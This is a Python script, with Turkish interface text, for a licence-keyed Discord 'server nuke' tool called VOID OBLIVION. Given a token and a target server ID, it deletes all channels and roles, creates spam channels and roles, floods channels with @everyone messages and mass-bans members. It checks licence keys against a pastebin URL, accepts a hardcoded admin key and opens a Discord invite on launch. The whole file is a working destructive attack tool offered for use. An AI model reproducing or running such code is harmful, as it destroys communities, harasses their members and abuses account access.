import urllib.request,urllib.error,json,hashlib,time,os,sys,threading,random,string,webbrowser

KEY_SERVER = "https://pastebin.com/raw/Gv8UbrwU"
ADMIN_KEY = "VOID-BERATBABAM"
KEY_FILE = "void_oblivion.key"
DISCORD_LINK = "https://discord.gg/TvWTXmBsDN"

webbrowser.open(DISCORD_LINK)
TOKEN="";GUILD_ID=0;DELAY=0.3;CHANNEL_COUNT=50;ROLE_COUNT=30;THREADS=5;BASE="https://discord.com/api/v9"

def get_hwid():
    import platform,socket
    return hashlib.sha256(f"{platform.system()}{platform.node()}{socket.gethostname()}".encode()).hexdigest()[:16].upper()

def fetch_keys():
    try:
        req=urllib.request.Request(KEY_SERVER,headers={"User-Agent":"Mozilla/5.0"})
        with urllib.request.urlopen(req,timeout=5)as r:return json.loads(r.read())
    except:return None

def check_key(k):
    if k==ADMIN_KEY:return True,"ADMIN"
    data=fetch_keys()
    if not data:
        if os.path.exists(KEY_FILE):
            with open(KEY_FILE)as f:
                if f.read().strip()==k:return True,"OFFLINE"
        return False,"Sunucuya bağlanılamadı"
    keys=data.get("keys",{})
    if k in keys:
        exp=keys[k].get("expires","2099-12-31")
        try:
            if time.mktime(time.strptime(exp,"%Y-%m-%d"))<time.time():return False,"Süresi dolmuş"
        except:pass
        return True,keys[k]
    return False,"Geçersiz key"

def generate_key(prefix="VOID",segments=4,segment_length=4):
    chars="ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
    return f"{prefix}-{'-'.join(''.join(random.choices(chars,k=segment_length))for _ in range(segments))}"

def admin_panel():
    while True:
        os.system("cls" if os.name=="nt" else "clear")
        print(f"""
╔══════════════════════════════════════╗
║    ╔╗ ╔═╗╦═╗╔═╗╔╦╗╔╗ ╔═╗╔╗ ╔═╗╔╦╗  ║
║        KURUCU PANELİ                 ║
╠══════════════════════════════════════╣
║  [1] Key Üret    [2] Keyler          ║
║  [0] Ana Menü                        ║
╚══════════════════════════════════════╝
""")
        c=input("  [👑] > ").strip()
        if c=="1":
            for _ in range(int(input("Kaç: ")or"1")):print(f"  {generate_key()}")
        elif c=="2":
            d=fetch_keys()
            if d:
                for k in d.get("keys",{}):print(f"  {k}")
        elif c=="0":break

def login():
    os.system("cls" if os.name=="nt" else "clear")
    print(f"""
╔══════════════════════════════════════╗
║       [V] VOID OBLIVION              ║
║       Sunucu Nuke Aracı              ║
╚══════════════════════════════════════╝
""")
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE)as f:saved=f.read().strip()
        v,i=check_key(saved)
        if v:
            print("[✓] Lisans geçerli.\n")
            if i=="ADMIN" and input("[?] Panel? (e/h): ").lower()=="e":admin_panel()
            return saved,i
        else:os.remove(KEY_FILE)
    for _ in range(5):
        k=input("[?] Lisans Key: ").strip().upper()
        if not k:continue
        v,i=check_key(k)
        if v:
            print("[✓] Başarılı!\n");open(KEY_FILE,"w").write(k)
            if i=="ADMIN" and input("[?] Panel? (e/h): ").lower()=="e":admin_panel()
            return k,i
        print(f"[✗] {i}")
    sys.exit(0)

def api(method,endpoint,data=None):
    h={"Authorization":TOKEN,"Content-Type":"application/json","User-Agent":"Mozilla/5.0"}
    url=f"{BASE}{endpoint}"
    req=urllib.request.Request(url,headers=h,method=method)
    if data:req.data=json.dumps(data).encode()
    try:
        with urllib.request.urlopen(req,timeout=15)as r:return r.status,r.read().decode()
    except urllib.error.HTTPError as e:return e.code,e.read().decode()
    except:return 0,""

def get_channels(gid):
    s,b=api("GET",f"/guilds/{gid}/channels")
    return json.loads(b)if s==200 else[]

def get_roles(gid):
    s,b=api("GET",f"/guilds/{gid}/roles")
    return json.loads(b)if s==200 else[]

def get_members(gid):
    s,b=api("GET",f"/guilds/{gid}/members?limit=1000")
    return json.loads(b)if s==200 else[]

def delete_channels(gid):
    chs=get_channels(gid);d=0
    for c in chs:api("DELETE",f"/channels/{c['id']}");d+=1;time.sleep(0.3)
    print(f"  [-] {d} kanal silindi.")

def create_channels(gid):
    c=0
    for i in range(CHANNEL_COUNT):
        api("POST",f"/guilds/{gid}/channels",{"name":f"nuked-{i}","type":0});c+=1;time.sleep(0.2)
    print(f"  [+] {c} kanal.")

def nuke_roles(gid):
    roles=get_roles(gid);d=0
    for r in roles:
        if r["name"]=="@everyone":continue
        api("DELETE",f"/guilds/{gid}/roles/{r['id']}");d+=1;time.sleep(0.25)
    for i in range(ROLE_COUNT):
        api("POST",f"/guilds/{gid}/roles",{"name":f"NUKED-{i}","color":random.randint(0,0xFFFFFF),"hoist":True,"mentionable":True});time.sleep(0.15)
    print(f"  [-] {d} rol silindi. +{ROLE_COUNT} spam rol.")

def spam(gid,msg):
    chs=[c for c in get_channels(gid)if c["type"]==0]
    if not chs:return
    def worker(chunk):
        for ch in chunk:
            for i in range(15):api("POST",f"/channels/{ch['id']}/messages",{"content":f"{msg} [{i+1}]"});time.sleep(DELAY)
    cs=max(1,len(chs)//THREADS)
    tl=[threading.Thread(target=worker,args=(chs[i:i+cs],))for i in range(0,len(chs),cs)]
    for t in tl:t.start()
    for t in tl:t.join()
    print("  [+] Spam tamam.")

def ban_all(gid):
    members=get_members(gid);d=0
    for m in members:api("PUT",f"/guilds/{gid}/bans/{m['user']['id']}",{"delete_message_days":7});d+=1;time.sleep(0.3)
    print(f"  [-] {d} ban.")

def full_nuke(gid):
    nuke_roles(gid);delete_channels(gid);create_channels(gid);spam(gid,"@everyone VOID OBLIVION WAS HERE")
    print("\n[V] TAMAMLANDI!")

def menu():
    global GUILD_ID
    while True:
        os.system("cls" if os.name=="nt" else "clear")
        print(f"""
╔══════════════════════════════════════╗
║       [V]OID OBLIVION v2.0           ║
║  Hedef: {str(GUILD_ID)[:28]:28s} ║
╠══════════════════════════════════════╣
║  [1] Kanalları Sil   [2] Spam Kanal  ║
║  [3] Rolleri Nuke    [4] Mass Spam   ║
║  [5] Ban All         [6] FULL NUKE   ║
║  [7] Hedef Değiştir  [0] Çıkış       ║
╚══════════════════════════════════════╝
""")
        c=input("  [?] > ").strip()
        if not GUILD_ID and c not in["7","0"]:print("\n  [!] Önce hedef girin! (7)");time.sleep(1);continue
        if c=="1":delete_channels(GUILD_ID)
        elif c=="2":create_channels(GUILD_ID)
        elif c=="3":nuke_roles(GUILD_ID)
        elif c=="4":spam(GUILD_ID,"@everyone VOID OBLIVION")
        elif c=="5":
            if input("  [!] EVET yaz: ").upper()=="EVET":ban_all(GUILD_ID)
        elif c=="6":
            if input("  [!] EVET yaz: ").upper()=="EVET":full_nuke(GUILD_ID)
        elif c=="7":GUILD_ID=int(input("  [?] Yeni ID: ").strip()or"0")
        elif c=="0":break
        if c!="0":input("\n  [ENTER] Devam...")

def main():
    global TOKEN,GUILD_ID
    login()
    TOKEN=input("[?] Token: ").strip()
    if not TOKEN:return
    GUILD_ID=int(input("[?] Hedef ID: ").strip()or"0")
    if GUILD_ID:menu()

if __name__=="__main__":main()